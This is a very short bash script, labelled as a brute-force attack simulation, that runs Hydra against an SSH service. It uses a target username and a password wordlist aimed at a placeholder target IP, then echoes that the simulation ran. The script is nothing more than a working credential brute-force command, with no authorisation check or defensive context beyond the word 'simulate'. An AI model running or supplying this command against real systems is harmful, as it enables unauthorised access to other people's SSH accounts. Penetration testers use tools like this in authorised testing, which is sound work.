#!/bin/bash

# Simulate brute force attack using Hydra
hydra -l target_username -P /path/to/wordlist.txt ssh://target_ip
echo "Brute Force attack simulation executed"
